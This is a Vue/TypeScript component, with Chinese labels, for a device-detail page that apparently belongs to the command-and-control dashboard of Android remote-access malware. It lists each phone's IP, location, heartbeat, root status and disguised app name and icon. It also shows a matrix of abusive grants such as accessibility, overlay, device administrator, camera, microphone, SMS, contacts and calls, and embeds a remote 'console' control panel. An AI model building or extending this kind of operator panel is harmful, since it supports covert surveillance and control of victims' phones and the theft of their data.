<script setup lang="ts">
import { onMounted, ref } from 'vue'
import { useRouter } from 'vue-router'
import { message } from 'ant-design-vue'
import { ArrowLeftOutlined, ReloadOutlined } from '@ant-design/icons-vue'
import PageContainer from '#/layouts/components/PageContainer.vue'
import ControlPanel from './ControlPanel.vue'
import { fetchDeviceDetail } from '#/api/devices'
import type { DeviceDetailFields } from '#/types/device'
import { apiError } from '#/api/http'

const props = defineProps<{ phoneId: string }>()
const router = useRouter()

const detail = ref<DeviceDetailFields | null>(null)
const loading = ref(false)

async function load() {
  loading.value = true
  try {
    const res = await fetchDeviceDetail(props.phoneId)
    if (res.status !== 'success' || !res.device) throw new Error(res.message || '设备不存在')
    detail.value = res.device
  } catch (err) {
    message.error(apiError(err, '加载设备详情失败'))
  } finally {
    loading.value = false
  }
}

onMounted(load)

function permLabel(value: string | number | undefined): string {
  return String(value) === '1' ? '✓ 已授权' : '— 未授权'
}
</script>

<template>
  <PageContainer :title="`设备 — ${phoneId}`" :subtitle="detail?.usrname ? `归属：${detail.usrname}` : ''">
    <template #extra>
      <a-space>
        <a-button @click="router.back()">
          <ArrowLeftOutlined /> 返回
        </a-button>
        <a-button :loading="loading" @click="load">
          <ReloadOutlined /> 刷新
        </a-button>
      </a-space>
    </template>

    <a-spin :spinning="loading">
      <a-tabs>
        <a-tab-pane key="info" tab="设备信息">
          <a-descriptions
            v-if="detail"
            :column="{ xs: 1, sm: 2, md: 3 }"
            bordered
            size="small"
          >
            <a-descriptions-item label="型号">{{ detail.phonemodel || '—' }}</a-descriptions-item>
            <a-descriptions-item label="系统">{{ detail.phoneandroid || '—' }}</a-descriptions-item>
            <a-descriptions-item label="电量">{{ detail.phonebattery || '—' }}</a-descriptions-item>
            <a-descriptions-item label="运营商">{{ detail.phoneoperator || '—' }}</a-descriptions-item>
            <a-descriptions-item label="国家">{{ detail.phonecountry || '—' }}</a-descriptions-item>
            <a-descriptions-item label="IP">{{ detail.phoneip || '—' }}</a-descriptions-item>
            <a-descriptions-item label="位置">{{ detail.phonelocation || '—' }}</a-descriptions-item>
            <a-descriptions-item label="状态">
              {{ String(detail.phone_status) === '1' ? '已启用' : '已禁用' }}
            </a-descriptions-item>
            <a-descriptions-item label="最后心跳">{{ detail.last_seen || '—' }}</a-descriptions-item>
            <a-descriptions-item label="分辨率">{{ detail.screen_resolution || '—' }}</a-descriptions-item>
            <a-descriptions-item label="RAM">
              {{ detail.free_ram || '—' }} / {{ detail.total_ram || '—' }}
            </a-descriptions-item>
            <a-descriptions-item label="存储">
              {{ detail.free_storage || '—' }} / {{ detail.total_storage || '—' }}
            </a-descriptions-item>
            <a-descriptions-item label="Root">{{ String(detail.is_rooted) === '1' ? '是' : '否' }}</a-descriptions-item>
            <a-descriptions-item label="安装时间">{{ detail.install_date || '—' }}</a-descriptions-item>
            <a-descriptions-item label="应用名称">{{ detail.app_name || '—' }}</a-descriptions-item>
            <a-descriptions-item label="应用图标">
              <a-avatar v-if="detail.app_icon" :src="detail.app_icon" :size="32" />
              <span v-else>—</span>
            </a-descriptions-item>
          </a-descriptions>
          <a-empty v-else description="无数据" />
        </a-tab-pane>

        <a-tab-pane key="perms" tab="权限矩阵">
          <a-descriptions
            v-if="detail"
            :column="{ xs: 1, sm: 2, md: 3 }"
            bordered
            size="small"
          >
            <a-descriptions-item label="无障碍">{{ permLabel(detail.accessibility) }}</a-descriptions-item>
            <a-descriptions-item label="通知">{{ permLabel(detail.notification) }}</a-descriptions-item>
            <a-descriptions-item label="悬浮窗">{{ permLabel(detail.overlay) }}</a-descriptions-item>
            <a-descriptions-item label="显示权限">{{ permLabel(detail.display) }}</a-descriptions-item>
            <a-descriptions-item label="设备管理员">{{ permLabel(detail.admin) }}</a-descriptions-item>
            <a-descriptions-item label="前置摄像头">{{ permLabel(detail.frontcam) }}</a-descriptions-item>
            <a-descriptions-item label="后置摄像头">{{ permLabel(detail.backcam) }}</a-descriptions-item>
            <a-descriptions-item label="麦克风">{{ permLabel(detail.microphone) }}</a-descriptions-item>
            <a-descriptions-item label="短信">{{ permLabel(detail.sms_permission) }}</a-descriptions-item>
            <a-descriptions-item label="联系人">{{ permLabel(detail.contacts_permission) }}</a-descriptions-item>
            <a-descriptions-item label="存储">{{ permLabel(detail.storage_permission) }}</a-descriptions-item>
            <a-descriptions-item label="通话">{{ permLabel(detail.call_permission) }}</a-descriptions-item>
            <a-descriptions-item label="相机">{{ permLabel(detail.camera_permission) }}</a-descriptions-item>
            <a-descriptions-item label="位置">{{ permLabel(detail.location_permission) }}</a-descriptions-item>
          </a-descriptions>
          <a-empty v-else description="无数据" />
        </a-tab-pane>

        <a-tab-pane key="control" tab="控制台">
          <ControlPanel :phone-id="phoneId" />
        </a-tab-pane>
      </a-tabs>
    </a-spin>
  </PageContainer>
</template>
